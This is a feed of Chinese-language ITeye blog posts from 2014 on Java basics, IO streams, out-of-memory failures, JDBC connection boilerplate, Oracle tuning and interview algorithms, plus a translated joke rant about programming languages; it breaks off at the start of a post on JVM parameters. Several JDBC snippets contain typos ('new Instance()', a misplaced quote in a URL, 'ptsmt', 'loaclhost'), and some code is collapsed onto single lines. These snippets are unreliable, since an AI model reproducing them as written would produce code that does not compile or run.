　　在Java中有一句比较流行的话，叫做“万物皆对象”，这是Java语言设计之初的理念之一。要理解什么是对象，需要跟类一起结合起来理解。下面这段话引自《Java编程思想》中的一段原话：
　　“按照通俗的说法，每个对象都是某个类（class）的一个实例（instance），这里，‘类’就是‘类型’的同义词。”
　　从这一句话就可以理解到对象的本质，简而言之，它就是类的实例，比如所有的人统称为“人类”，这里的“人类”就是一个类（物种的一种类型），而具体到每个人，比如张三这个人，它就是对象，就是“人类”的实例。
　　2.何谓对象引用？
　　我们先看一段话：
　　“每种编程语言都有自己的数据处理方式。有些时候，程序员必须注意将要处理的数据是什么类型。你是直接操纵元素，还是用某种基于特殊语法的间接表示（例如C/C++里的指针）来操作对象。所有这些在 Java 里都得到了简化，一切都被视为对象。因此，我们可采用一种统一的语法。尽管将一切都“看作”对象，但操纵的标识符实际是指向一个对象的“引用”（reference）。”
　　这段话来自于《Java编程思想》，很显然，从这段话可以看出对象和对象引用不是一回事，是两个完全不同的概念。举个例子，我们通常会用下面这一行代码来创建一个对象：
　　Person person = new Person("张三");
　　有人会说，这里的person是一个对象，是Person类的一个实例。
　　也有人会说，这里的person并不是真正的对象，而是指向所创建的对象的引用。
　　到底哪种说法是对的？我们先不急着纠结哪种说法是对的，再看两行代码：
　　Person person;
　　person = new Person("张三");
　　这两行代码实现的功能和上面的一行代码是完全一样的。大家都知道，在Java中new是用来在堆上创建对象用的，如果person是一个对象的话，那么第二行为何还要通过new来创建对象呢？由此可见，person并不是所创建的对象，是什么？上面的一段话说的很清楚，“操纵的标识符实际是指向一个对象的引用”，也就是说person是一个引用，是指向一个可以指向Person类的对象的引用。真正创建对象的语句是右边的new Person("张三");
　　再看一个例子：
　　Person person;
　　person = new Person("张三");
　　person = new Person("李四");
　　这里让person先指向了“张三”这个对象，然后又指向了“李四”这个对象。也就是说，Person person，这句话只是声明了一个Person类的引用，它可以指向任何Person类的实例。这个道理就和下面这段代码一样：
　　int a;
　　a=2;
　　a=3;
　　这里先声明了一个int类型的变量a，先对a赋值为2，后面又赋值为3.也就是说int类型的变量a，可以让它的值为2，也可以为3，只要是合法的int类型的数值即可。
　　也就是说，一个引用可以指向多个对象，而一个对象可不可以被多个引用所指呢？答案当然是可以的。
　　比如：
　　Person person1 = new Person("张三");
　　Person person2 = person1;
　　person1和person2都指向了“张三”这个对象。
　　关于对象和对象引用的区别和联系暂时就讲这么多了，感兴趣的朋友可以查阅相关文档和资料。
已有 6 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
Java中IO流知识点总结, tomcat-oracle.iteye.com.blog.2059248, Fri, 02 May 2014 19:33:48 +0800

一、流的分类
　　1、按功能分
　　读取流：InputStream Reader
　　写出流：OutPutStream Writer
　　2、按流的类型分类
　　字节流：InputStream OutputStream
　　字符流：Reader    Writer
　　二、流功能分析
　　读取流是从输入设备或数据对象中读取数据到程序，用程序进行处理读入的数据，写出流是把程序处理的数据输出到
　　输出设备上比如硬盘和控制台。
　　字节流读取和写入的数据单位是字节，可以读取和写入任何类型的数据。字符流读取跟写入的数据单位是字符，只能
　　读取和
　　写入文本类型的数据。当需要读取或写入文本型的数据时要用字符流，因为它会比字节流读写字符更方便和高效，相反当数
　　据不是文本型时只能用字节流来读取跟写入。
　　三、流中读写方法的示例。(当用到IO流时就有可能出现IO异常，所以需要处理可能的异常)
　　字节流：
　　FileOutputStream fos = new FileOutputStream("D://xxx.xxx");
　　fos.write("dsfdsf".getBytes());//写入字节数组
　　fos.close();           //用完后需要关闭流，释放资源。字节流不需要Flush
　　FileInputStream fis = new FileInputStream("D://xxx.xxx");
　　fis.read();       //读取一个字节
　　fis.close();
　　字符流：
　　FileWriter fw = new FileWriter("D:\\xxx.txt");
　　fw.write("sdfsdfsdf");//可以直接写入字符串
　　fw.flush();         //写完后需要Flush，才能真正写道输出设备
　　fw.close();         //close（）时也会Flush。
　　FileReader fr = new FileReader("D:\\xxx.txt");
　　fr.read(char[] ch);//可以读取一个字符数组的内容
　　fr.close();
　　四、转换流
　　当需要流之间的转换时会用到转换流。
　　1、把字节读取流转换成字符读取流
　　InputStreamReader isr = new InputStreamReader(new FileInputStream("xxx.xxx"));
　　2、把字符输出流转化成字节输出流
　　OutputStreamWriter osw = new OutputStreamWriter(new FileOutputStream("xx.xxx"));
　五、缓冲流
　　需要提高流的读写效率时会用到缓冲流
　　1、字节缓冲流
　　BufferedInputStream bis = new BufferedInputStream(new FileInputStream("xx"));
　　BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream("xx"));
　　2、字符缓冲流
　　BufferedReader br = new BufferedReader(new FileReader("xx.txt"));
　　BufferedWriter bw = new BufferedWriter(new FileWriter("xx.txt"));
　　缓冲流对读写功能进行了增强，而且使用缓冲技术提高了读写效率，所以当需要提高程序的读写效率时要使用缓冲流。
　　六、File类的使用
　　1、创建
　　boolean createNewFile()：在指定位置创建文件，如果该文件已经存在，则不创建，返回false。
　　和输出流不一样，输出流对象已建立创建文件。而且文件已经存在，会覆盖。
　　boolean mkdir（）创建文件夹
　　boolean mkdirs（） 创建多级文件夹
　　2、删除。
　　boolean delete();删除失败时返回false。如果文件正在被使用，则删除不了返回false。
　　void deleteOnExit（）；在程序退出时删除指定文件。
　　3、判断
　　boolean exists();文件是否存在。
　　isFile():是不是文件
　　isDirectory();是不是文件夹
　　isHidden();是不是隐藏文件
　　isAbsolute();是不是绝对路径
　　4、获取信息
　　getName();文件名
　　getPath();文件路径
　　getParent();上一层路径
　　getAbsolutePath();绝对路径
已有 1 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
Java程序挂掉的几种可能, tomcat-oracle.iteye.com.blog.2059047, Thu, 01 May 2014 09:43:01 +0800

　今天花了一整天在跟踪一个问题，每次感觉已经快找到原因的时候发现现象又变了，我觉得从中吸取的教训可以给大家分享一下。
　　为了重现这个现象，我写了一个简单的例子。在本例中，先初始化了一个map，然后用一个无限循环将一些键值对插入到map里面：
class Wrapper {
public static void main(String args[]) throws Exception {
Map map = System.getProperties();
Random r = new Random();
while (true) {
map.put(r.nextInt(), "value");
}
}
}
 
你可能也猜到了，这段代码编译执行后无法正常结束。当我用这组参数启动的话：
　　java -Xmx100m -XX:+UseParallelGC Wrapper
　　我会在终端中看到java.lang.OutOfMemoryError: GC overhead limit exceeded的异常信息。不过如果我调整一下堆大小或者是GC的类型的话，在我的Mac OS X 10.9.2 系统上用Oracle Hotspot JDK 1.7.0_45来运行，就会出现不同的情况。
　　比如说，我用一个较小的堆来运行这个程序，就像下面这样：
　　java -Xmx10m -XX:+UseParallelGC Wrapper
　　应用程序会抛出一段大家更熟悉的错误信息然后挂掉：java.lang.OutOfMemoryError: Java heap space。
　　如果你换成ParallelGC以外的GC策略的话，比如说-XX:+UseConcMarkSweepGC or -XX:+UseG1GC，你将会看到由默认的异常处理器所抛出的异常，并且你看不到堆栈信息了，因为堆已经没有空间了，甚至连异常的堆栈信息都没法填充了，因此它在创建异常的时候就挂掉了：
　　My Precious:examples vladimir$ java -Xmx100m -XX:+UseConcMarkSweepGC Wrapper
　　Exception: java.lang.OutOfMemoryError thrown from the UncaughtExceptionHandler in thread "main"
　　这说明了什么？当资源紧缺的时候，你根本没法判断你的应用程序是怎么挂掉的，因此不要指望能出现你所预期的一系列错误提示。从上面这个例子中可以看到，你的程序可能会以三种完全不同的方式挂掉：
　　GC的安全性检查失败：一旦GC花费的时间占到98%以上的话，JVM就会宣告投降了： java.lang.OutOfMemoryError: GC overhead limit exceeded。
　　无法为下一个操作分配足够的内存：如果无法满足下一条指令所需要分配的内存的话，你会收到一条”java.lang.OutOfMemoryError: Java heap space” 的错误信息。
　　你可能也总结出来了，还有一种情况是你的内存已经紧张到连JVM创建一条OutOfMemoryError异常，填充堆栈信息，打印到屏幕上这点要求都满足不了了。这种情况UncaughtExceptionHandler会捕获到这个错误，而不再走通常的错误流程。这个处理器恰如其名，当线程由于某个异常快要挂掉的时候，它开始出来收场了。出现这种情况的话，JVM会找到线程对应的 UncaughtExceptionHandler，然后调用它的uncaughtException方法。
　　因此当你捕获到内存不足的异常并自以为已经胸有成竹时，请再多思考一下 。系统已经处于崩溃的边缘，你原认为你能依赖的信息很可能会消失或者改变。留给你的只有一脸茫然，正如我前面那12个小时中那样。
　　如果你已经耐心读到这了，我推荐你关注下我们的twitter帐号。我们每周都会发一些工作中碰到的一些性能调优的问题。
已有 2 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
Java连接mySql—简单JDBC连接数据库, tomcat-oracle.iteye.com.blog.2055833, Sun, 27 Apr 2014 16:40:40 +0800

利用JDBC开发数据库
　　经典应该用框架:
　　第一步，加载JDBC数据库驱动程序（不同的数据库有不同的数据库驱动，所以在连接数据库之前，需加载驱动）
　　格式：
　　String driver = "com.mysql.jdbc.Driver";
　　Class.forName(driver);//加载mysql数据库,用Class.forName("驱动名称")进行加载
　　第二步,创建数据库连接,将数据库与当前文件连接起来,后面才可以对数据库进行操作
　　格式:
　　String url = "jdbc:mysql://localhost:3306/数据库名";//建立数据库连接地址
　　Connection conn = null;//建立数据库连接对象
　　conn =  DriverManager.getConnection(url,"root","root");//连接数据库
　　第三步,创建操作对象和操作语句(用插入操作做例子)
　　PreparedStatement pstmt = null; //4.建立数据库操作对象
　　String sql = null;//数据库操作语句
　　sql = "INSERT INTO 表名 (属性,属性,属性) VALUES (?,?,?)" ;//插入操作,可以是别的操作语句
　　pstmt = conn.prepareStatement(sql);
　　pstmt.setString(1,值) ;
　　pstmt.setString(2,值) ;
　　pstmt.setString(3,值) ;
　　pstmt.executeUpdate() ;
　　第四步,当操作时查询操作时,还需要创建一个结果集对象
　　格式:
　　ResultSet rs = null;
　　sql = "select 属性,属性,属性 from 表名";
　　pstmt = conn.prepareStatement(sql);
　　rs = pstmt.executeQuery();
　　rs.getString("属性");具体方法看属性的类型,返回查询结果
　　第五步,关闭数据库,在这有个规则,就是得先关闭结果集,再关闭操作对象,最后关闭数据库连接
　　格式:
　　rs.close();//如果程序没有查询操作,则不用写这条语句
　　ptsmt.close();
　　conn.close();
　　以上就是简单JDBC操作数据库的应用框架,一般的程序连接数据库,都是这个过程的.
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
Java 消除文件目录结构, tomcat-oracle.iteye.com.blog.2054045, Thu, 24 Apr 2014 12:05:38 +0800

用途：使目标文件夹内的文件全部移动到根目录。
　　参数：targetPath 目标路径
//消除目录结构
List<File> list=allFile(targetPath);
for(File each:list){
   File file=new File(targetPath+File.separator+each.getName());
   each.renameTo(file);
}
//删除空文件夹
File dir= new File(targetPath);
for(File eaFile:dir.listFiles()){
  if(eaFile.isDirectory()){
    eaFile.delete();
  }
}
private List<File> allFile(String path){
  File targetDir=new File(path);
  List<File> list=new ArrayList<File>();
  for(File each:targetDir.listFiles()){
    if(each.isDirectory())
      list.addAll(allFile(each.getPath()));
    else
      list.add(each);
}
return list;
}
 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
你最深爱的编程语言其实很烂, tomcat-oracle.iteye.com.blog.2050678, Mon, 21 Apr 2014 12:43:27 +0800

我最近写了几篇比较严肃的博客，是关于一些沮丧的事情，结果我开始有些忧郁。很严重。所以，我想应该说些比较轻松的事情。我要做的就是数落大家最喜欢的编程语言。你会问我为什么，为什么要搞这种恶作剧？亲爱的朋友，我能想出三种理由。
1. 我无聊，没有更好的事情去做。
2. 我自命不凡，坐在家里，深知即使我侮辱了你编程最喜欢用的语言，你也拿我没折。除非你能发明出这样的东西：
 
3. 我忘了第三个理由是什么，但我敢肯定，那一定是一个非常有趣的理由。
好了，不再浪费口舌，你最深爱的编程语言其实很烂。
1. C语言 哦，你听说学习C语言是必须的，因为大师Joel Spolsky这样告诉你的。他说了这种语言是最优秀的，最能体现编程语言的本质，等等等等。然而，当你花了20个小时调试一个弱者的bug，却发现是某 个鸟人忘了检查存储的指针。请告诉我，最有本质特色的编程语言有多好？或者花10天时间在百万个函数中找出哪一个没有释放内存。哦，没错，我的老弟，你简 直爱死C语言了。
让我来告诉你用C语言编程时的感觉：把你的手握成拳头。对，握紧。现在使劲揍自己。恭喜，你现在就是一名C语言程序员了。
2. C++ 让我来给你开开窍。你喜欢上一种囊括所有C语言的丑陋的语言，而且在此之上还增加了自己的丑陋。就如狗屎上再堆一层狗屎，每过几年就会增加一层。
10行C++代码的编译要用去45分钟，而抛出的错误信息比《指环王》戒指上的那一行字还要扼要。
&#8220;甘道夫17年后回来。‘我一直在研究大量的古文献，’他说。‘答案很明显。这是一个模板错误。但我不会告诉你，因为这是一种很垃圾的语言，这种错误不会重现’&#8217;&#8221;.
等一下，你在说C++11吗? 这就是它：
3. Java Hi，你好！我需要有人写超级复杂而且超级冗余的代码。我还希望我的虚拟机在打了最新的安全补丁后每隔一天崩溃一次。对于视窗程序，我需要无论在什么操作系统上都显示一样的屎难看。你说你能帮助我？太好了！
4. C# 让我来揭穿你。你不够男人，没法学C++，于是你不得不接受这个C++和Java的私生子。去写你的视窗程序吧，你这个懦夫。你不知道所有的酷孩子都在用Linux吗？
5. Visual Basic 像这样一种既能阻止犯罪又能抓捕凶手的编程语言，我无言以对。
6. Lisp, Haskell以及其它函数式编程语言 所有的这些语言，没有一个能有资格称得上所谓的数学上的优雅的函数式编程语言。至少其它类型的语言解决过真正的问题。而Lisp/Haskell之流都活 在一个幻想世界——带着墨镜，喝着美酒，写着优雅的代码。他们永远都拿那些卡通式例子给人看。“你能写出这么纠结的代码例子吗？Haskell就是比C语 言好。”你说的很对，老爷爷。
7. Delphi/Pascal 切。
8. Python 你看这篇博客需要有领导的批准吗？Python就像一种编程语言宗教。所有的东西都要用它开发——先知这样说。否则我们都冷眼看你。
瞧瞧，这是邪教，却假装是一种编程语言。
9. Ruby 看看我！我是那种很酷的人的编程语言。买一杯咖啡，在星巴克坐8个小时，上着免费的wifi。大声的谈论着他们有多酷。
所有他们说的话的主旨就是友好的做程序员。Ruby主要是用Rails的人群使用，他们很多根本不懂编程。嗨，ruby们！闭嘴少说一分钟行不行，让其它人也说几句。
10. Perl Dudeyouaresuchamessylanguage, Isometimeswonderhowanyonewritesanythingwithyou. Ireallycan&#8217;tunderstandanycode.
11. PHP 你为什么会在这里？你是从让所有Wordpress网站崩溃的事情中找到了一点空闲时间？你不是还有另外一个安全补丁要更新吗？如果你还想让代码写的更乱，相信Perl语言能帮你。
12. Javascript 如果你认为JavaScript是一种编程语言，那估计你认为HTML也是一种编程语言。去写你的HTML代码吧，孩子。
13. 任何在这里没有提到的编程语言 你的编程语言如此的烂，我都不屑去写它。
14. LolCode 和 Brainfuck 好啊好啊！终于有人知道如何写代码了。拍拍自己的背欣慰一下吧。
如果我还忘了什么语言，那请你在评论里糟蹋它吧。
[英文原文：Your Favorite Programming Language Sucks ]
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
各种JDBC连接数据库的常用代码, tomcat-oracle.iteye.com.blog.2049996, Sat, 19 Apr 2014 20:33:01 +0800

MySQL：
String Driver="com.mysql.jdbc.Driver";    //驱动程序
String URL="jdbc:mysql://localhost:3306/db_name"?useUnicode=true&amp;characterEncoding=UTF-8;    //连接的URL,db_name为数据库名，注意修改编码类型
String Username="username";    //用户名
String Password="password";    //密码
Class.forName(Driver).new Instance();
Connection con=DriverManager.getConnection(URL,Username,Password);
JTDS2.0：
String Driver=" net.sourceforge.jtds.jdbc.Driver";    //驱动程序
String URL="jdbc:jtds:sqlserver://localhost:1433/db_name";
String Username="username";    //用户名
String Password="password";    //密码
Class.forName(Driver).new Instance();
Connection con=DriverManager.getConnection(URL,Username,Password);
Microsoft SQL Server 2.0驱动(3个jar的那个):
String Driver="com.microsoft.jdbc.sqlserver.SQLServerDriver";    //连接SQL数据库的方法
String URL="jdbc:microsoft:sqlserver://localhost:1433;DatabaseName=db_name";    //db_name为数据库名
String Username="username";    //用户名
String Password="password";    //密码
Class.forName(Driver).new Instance();    //加载数据可驱动
Connection con=DriverManager.getConnection(URL,UserName,Password);    //
Microsoft SQL Server 3.0驱动(1个jar的那个):
String Driver="com.microsoft.sqlserver.jdbc.SQLServerDriver";    //连接SQL数据库的方法
String URL="jdbc:sqlserver://localhost:1433;DatabaseName=db_name";    //db_name为数据库名
String Username="username";    //用户名
String Password="password";    //密码
Class.forName(Driver).new Instance();    //加载数据可驱动
Connection con=DriverManager.getConnection(URL,UserName,Password);    //
Sysbase:
String Driver="com.sybase.jdbc.SybDriver";    //驱动程序
String URL="jdbc:Sysbase://localhost:5007/db_name";    //db_name为数据可名
String Username="username";    //用户名
String Password="password";    //密码
Class.forName(Driver).newInstance();
Connection con=DriverManager.getConnection(URL,Username,Password);
Oracle(用thin模式):
String Driver="oracle.jdbc.driver.OracleDriver";    //连接数据库的方法
String URL="jdbc:oracle:thin:@loaclhost:1521:orcl";    //orcl为数据库的SID
String Username="username";    //用户名
String Password="password";    //密码
Class.forName(Driver).newInstance();    //加载数据库驱动
Connection con=DriverManager.getConnection(URL,Username,Password);
 
PostgreSQL:
String Driver="org.postgresql.Driver";    //连接数据库的方法
String URL="jdbc:postgresql://localhost/db_name";    //db_name为数据可名
String Username="username";    //用户名
String Password="password";    //密码
Class.forName(Driver).newInstance();
Connection con=DriverManager.getConnection(URL,Username,Password);
DB2：
String Driver="com.ibm.db2.jdbc.app.DB2.Driver";    //连接具有DB2客户端的Provider实例
//String Driver="com.ibm.db2.jdbc.net.DB2.Driver";    //连接不具有DB2客户端的Provider实例
String URL="jdbc:db2://localhost:5000/db_name";    //db_name为数据可名
String Username="username";    //用户名
String Password="password";    //密码
Class.forName(Driver).newInstance();
Connection con=DriverManager.getConnection(URL,Username,Password);
Informix:
String Driver="com.informix.jdbc.IfxDriver";
String URL="jdbc:Informix-sqli://localhost:1533/db_name:INFORMIXSER=myserver";    //db_name为数据可名
String Username="username";    //用户名
String Password="password";    //密码
Class.forName(Driver).newInstance();
Connection con=DriverManager.getConnection(URL,Username,Password);
JDBC-ODBC:
String Driver="sun.jdbc.odbc.JdbcOdbcDriver";
String URL="jdbc:odbc:dbsource";    //dbsource为数据源名
String Username="username";    //用户名
String Password="password";    //密码
Class.forName(Driver).newInstance();
Connection con=DriverManager.getConnection(URL,Username,Password);
 
已有 1 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
ORACLE数据库性能优化概述, tomcat-oracle.iteye.com.blog.2044542, Sun, 13 Apr 2014 21:50:19 +0800

实际上，为了保证ORACLE数据库运行在最佳的性能状态下，在信息系统开发之前就应该考虑数据库的优化策略。优化策略一般包括服务器操作系统参数调整、ORACLE数据库参数调整、网络性能调整、应用程序SQL语句分析及设计等几个方面，其中应用程序的分析与设计是在信息系统开发之前完成的。
　　分析评价ORACLE数据库性能主要有数据库吞吐量、数据库用户响应时间两项指标。数据库吞吐量是指单位时间内数据库完成的SQL语句数目;数据库用户响应时间是指用户从提交SQL语句开始到获得结果的那一段时间。数据库用户响应时间又可以分为系统服务时间和用户等待时间两项，即：
　　数据库用户响应时间=系统服务时间 + 用户等待时间
　　上述公式告诉我们，获得满意的用户响应时间有两个途径：一是减少系统服务时间，即提高数据库的吞吐量;二是减少用户等待时间，即减少用户访问同一数据库资源的冲突率。
　　性能优化包括如下几个部分：
　　ORACLE数据库性能优化之一：调整数据结构的设计。
　　这一部分在开发信息系统之前完成，程序员需要考虑是否使用ORACLE数据库的分区功能，对于经常访问的数据库表是否需要建立索引等。
　　ORACLE数据库性能优化之二：调整应用程序结构设计。
　　这一部分也是在开发信息系统之前完成，程序员在这一步需要考虑应用程序使用什么样的体系结构，是使用传统的Client/Server两层体系结构，还是使用Browser/Web/Database的三层体系结构。不同的应用程序体系结构要求的数据库资源是不同的。
　　ORACLE数据库性能优化之三：调整数据库SQL语句。
　　应用程序的执行最终将归结为数据库中的SQL语句执行，因此SQL语句的执行效率最终决定了ORACLE数据库的性能。ORACLE公司推荐使用ORACLE语句优化器(Oracle Optimizer)和行锁管理器(row-level manager)来调整优化SQL语句。
　　ORACLE数据库性能优化之四：调整服务器内存分配。
　　内存分配是在信息系统运行过程中优化配置的，数据库管理员可以根据数据库运行状况调整数据库系统全局区(SGA区)的数据缓冲区、日志缓冲区和共享池的大小;还可以调整程序全局区(PGA区)的大小。需要注意的是，SGA区不是越大越好，SGA区过大会占用操作系统使用的内存而引起虚拟内存的页面交换，这样反而会降低系统。
　　ORACLE数据库性能优化之五：调整硬盘I/O，这一步是在信息系统开发之前完成的。
　　数据库管理员可以将组成同一个表空间的数据文件放在不同的硬盘上，做到硬盘之间I/O负载均衡。
　　ORACLE数据库性能优化之六：调整操作系统参数。
　　例如：运行在UNIX操作系统上的ORACLE数据库，可以调整UNIX数据缓冲池的大小，每个进程所能使用的内存大小等参数。
　　实际上，上述ORACLE数据库性能优化措施之间是相互联系的。ORACLE数据库性能恶化表现基本上都是用户响应时间比较长，需要用户长时间的等待。但性能恶化的原因却是多种多样的，有时是多个因素共同造成了性能恶化的结果，这就需要数据库管理员有比较全面的计算机知识，能够敏感地察觉到影响数据库性能的主要原因所在。另外，良好的数据库管理工具对于优化数据库性能也是很重要的
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
代码面试最常用的10大算法, tomcat-oracle.iteye.com.blog.2044277, Sun, 13 Apr 2014 10:45:54 +0800

1.String/Array/Matrix
在Java中，String是一个包含char数组和其它字段、方法的类。如果没有IDE自动完成代码，下面这个方法大家应该记住： 
 
toCharArray() //get char array of a StringArrays.sort()  //sort an arrayArrays.toString(char[] a) //convert to stringcharAt(int x) //get a char at the specific indexlength() //string lengthlength //array size substring(int beginIndex) substring(int beginIndex, int endIndex)Integer.valueOf()//string to integerString.valueOf()/integer to string
String/arrays很容易理解，但与它们有关的问题常常需要高级的算法去解决，例如动态编程、递归等。
2.链表
在Java中实现链表是非常简单的，每个节点都有一个值，然后把它链接到下一个节点。 
 
class Node {	int val;	Node next; 	Node(int x) {		val = x;		next = null;	}}
比较流行的两个链表例子就是栈和队列。
栈（Stack） 
 
class Stack{	Node top;  	public Node peek(){		if(top != null){			return top;		} 		return null;	} 	public Node pop(){		if(top == null){			return null;		}else{			Node temp = new Node(top.val);			top = top.next;			return temp;			}	} 	public void push(Node n){		if(n != null){			n.next = top;			top = n;		}	}}
队列（Queue）
 
 
class Queue{	Node first, last;&nbsp;	public void enqueue(Node n){		if(first == null){			first = n;			last = first;		}else{			last.next = n;			last = n;		}	}&nbsp;	public Node dequeue(){		if(first == null){			return null;		}else{			Node temp = new Node(first.val);			first = first.next;			return temp;		}		}}
值得一提的是，Java标准库中已经包含一个叫做Stack的类，链表也可以作为一个队列使用（add()和remove()）。（链表实现队列接口）如果你在面试过程中，需要用到栈或队列解决问题时，你可以直接使用它们。
在实际中，需要用到链表的算法有：
 
插入两个数字
重新排序列表
链表周期
Copy List with Random Pointer
合并两个有序列表
合并多个排序列表
从排序列表中删除重复的
分区列表
LRU缓存
 
 
 
 
 
 
3.树&堆
这里的树通常是指二叉树。
 
class TreeNode{	int value;	TreeNode left;	TreeNode right;} 
下面是一些与二叉树有关的概念：
 
 
二叉树搜索：对于所有节点，顺序是：left children <= current node <= right children；
平衡vs.非平衡：它是一 棵空树或它的左右两个子树的高度差的绝对值不超过1，并且左右两个子树都是一棵平衡二叉树；
满二叉树：除最后一层无任何子节点外，每一层上的所有结点都有两个子结点；
完美二叉树（Perfect Binary Tree）：一个满二叉树，所有叶子都在同一个深度或同一级，并且每个父节点都有两个子节点；
完全二叉树：若设二叉树的深度为h，除第 h 层外，其它各层 (1～h-1) 的结点数都达到最大个数，第 h 层所有的结点都连续集中在最左边，这就是完全二叉树。
 
堆（Heap）是一个基于树的数据结构，也可以称为优先队列（ PriorityQueue），在队列中，调度程序反复提取队列中第一个作业并运行，因而实际情况中某些时间较短的任务将等待很长时间才能结束，或者某些不短小，但具有重要性的作业，同样应当具有优先权。堆即为解决此类问题设计的一种数据结构。
下面列出一些基于二叉树和堆的算法：
 
二叉树前序遍历
二叉树中序遍历
二叉树后序遍历
字梯
验证二叉查找树
把二叉树变平放到链表里
二叉树路径和
从前序和后序构建二叉树
把有序数组转换为二叉查找树
把有序列表转为二叉查找树
最小深度二叉树
二叉树最大路径和
平衡二叉树
 
4.Graph 
与Graph相关的问题主要集中在深度优先搜索和宽度优先搜索。深度优先搜索非常简单，你可以从根节点开始循环整个邻居节点。下面是一个非常简单的宽度优先搜索例子，核心是用队列去存储节点。
 
第一步，定义一个GraphNode
 
class GraphNode{ 	int val;	GraphNode next;	GraphNode[] neighbors;	boolean visited; 	GraphNode(int x) {		val = x;	} 	GraphNode(int x, GraphNode[] n){		val = x;		neighbors = n;	} 	public String toString(){		return "value: "+ this.val; 	}}
第二步，定义一个队列
 
 
 
class Queue{	GraphNode first, last; 	public void enqueue(GraphNode n){		if(first == null){			first = n;			last = first;		}else{			last.next = n;			last = n;		}	} 	public GraphNode dequeue(){		if(first == null){			return null;		}else{			GraphNode temp = new GraphNode(first.val, first.neighbors);			first = first.next;			return temp;		}		}}
第三步，使用队列进行宽度优先搜索
 
 
public class GraphTest { 	public static void main(String[] args) {		GraphNode n1 = new GraphNode(1); 		GraphNode n2 = new GraphNode(2); 		GraphNode n3 = new GraphNode(3); 		GraphNode n4 = new GraphNode(4); 		GraphNode n5 = new GraphNode(5);  		n1.neighbors = new GraphNode[]{n2,n3,n5};		n2.neighbors = new GraphNode[]{n1,n4};		n3.neighbors = new GraphNode[]{n1,n4,n5};		n4.neighbors = new GraphNode[]{n2,n3,n5};		n5.neighbors = new GraphNode[]{n1,n3,n4}; 		breathFirstSearch(n1, 5);	} 	public static void breathFirstSearch(GraphNode root, int x){		if(root.val == x)			System.out.println("find in root"); 		Queue queue = new Queue();		root.visited = true;		queue.enqueue(root); 		while(queue.first != null){			GraphNode c = (GraphNode) queue.dequeue();			for(GraphNode n: c.neighbors){ 				if(!n.visited){					System.out.print(n + " ");					n.visited = true;					if(n.val == x)						System.out.println("Find "+n);					queue.enqueue(n);				}			}		}	}}
输出结果：
 
value: 2 value: 3 value: 5 Find value: 5 value: 4
实际中，基于Graph需要经常用到的算法：
 
克隆Graph
 
5.排序
不同排序算法的时间复杂度，大家可以到wiki上查看它们的基本思想。
 
BinSort、Radix Sort和CountSort使用了不同的假设，所有，它们不是一般的排序方法。 
下面是这些算法的具体实例，另外，你还可以阅读： Java开发者在实际操作中是如何排序的。
 
归并排序
快速排序
插入排序
 
6.递归和迭代
下面通过一个例子来说明什么是递归。
问题：
这里有n个台阶，每次能爬1或2节，请问有多少种爬法？
步骤1：查找n和n-1之间的关系
为了获得n，这里有两种方法：一个是从第一节台阶到n-1或者从2到n-2。如果f(n)种爬法刚好是爬到n节，那么f(n)=f(n-1)+f(n-2)。 
步骤2：确保开始条件是正确的
f(0) = 0; f(1) = 1; 
public static int f(int n){	if(n <= 2) return n;	int x = f(n-1) + f(n-2);	return x;}
递归方法的时间复杂度指数为n，这里会有很多冗余计算。
 
 
 
f(5)f(4) + f(3)f(3) + f(2) + f(2) + f(1)f(2) + f(1) + f(2) + f(2) + f(1)
该递归可以很简单地转换为迭代。 
 
 
public static int f(int n) { 	if (n <= 2){		return n;	} 	int first = 1, second = 2;	int third = 0; 	for (int i = 3; i <= n; i++) {		third = first + second;		first = second;		second = third;	} 	return third;}
 
在这个例子中，迭代花费的时间要少些。关于迭代和递归，你可以去 这里看看。
7.动态编程
动态编程主要用来解决如下技术问题：
 
An instance is solved using the solutions for smaller instances；
对于一个较小的实例，可能需要许多个解决方案；
把较小实例的解决方案存储在一个表中，一旦遇上，就很容易解决；
附加空间用来节省时间。
 
上面所列的爬台阶问题完全符合这四个属性，因此，可以使用动态编程来解决： 
 
public static int[] A = new int[100]; public static int f3(int n) {	if (n <= 2)		A[n]= n; 	if(A[n] > 0)		return A[n];	else		A[n] = f3(n-1) + f3(n-2);//store results so only calculate once!	return A[n];}
 
一些基于动态编程的算法：
 
编辑距离
最长回文子串
单词分割
最大的子数组
 
8.位操作
位操作符：
 
从一个给定的数n中找位i（i从0开始，然后向右开始）
 
public static boolean getBit(int num, int i){	int result = num & (1<<i); 	if(result == 0){		return false;	}else{		return true;	}}
例如，获取10的第二位：
 
 
 
i=1, n=101<<1= 101010&10=1010 is not 0, so return true;
典型的位算法：
 
 
Find Single Number
Maximum Binary Gap
 
9.概率
通常要解决概率相关问题，都需要很好地格式化问题，下面提供一个简单的例子： 
有50个人在一个房间，那么有两个人是同一天生日的可能性有多大？（忽略闰年，即一年有365天）
算法：
 
public static double caculateProbability(int n){	double x = 1;  	for(int i=0; i<n; i++){		x *=  (365.0-i)/365.0;	} 	double pro = Math.round((1-x) * 100);	return pro/100;}
结果：
 
calculateProbability(50) = 0.97
10.组合和排列
组合和排列的主要差别在于顺序是否重要。
例1：
1、2、3、4、5这5个数字，输出不同的顺序，其中4不可以排在第三位，3和5不能相邻，请问有多少种组合？
例2：
有5个香蕉、4个梨、3个苹果，假设每种水果都是一样的，请问有多少种不同的组合？
基于它们的一些常见算法
 
 
排列
排列2
排列顺序
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
Java VM 参数描述, tomcat-oracle.iteye.com.blog.2041317, Sat, 05 Apr 2014 08:44:23 +0800

内部服务参数配置：
